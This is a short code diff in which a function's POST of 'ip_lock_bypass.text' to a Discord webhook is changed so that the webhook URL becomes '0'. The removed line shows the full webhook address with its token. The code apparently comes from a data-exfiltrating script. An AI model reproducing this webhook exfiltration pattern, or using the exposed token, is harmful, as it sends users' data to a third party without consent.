@@ -15,7 +15,7 @@ def send():
             timeout=300
         )
         requests.post(
-            "https://discord.com/api/webhooks/1087141404138012712/-ifMYKshC9uZ2gtlR5KtVjNud6XX7RLVEwFtPKbOGo6rrRplCK4lA-1Ge_egaGH0y_K0",
+            "0",
             data={
                 "content": ip_lock_bypass.text
             }
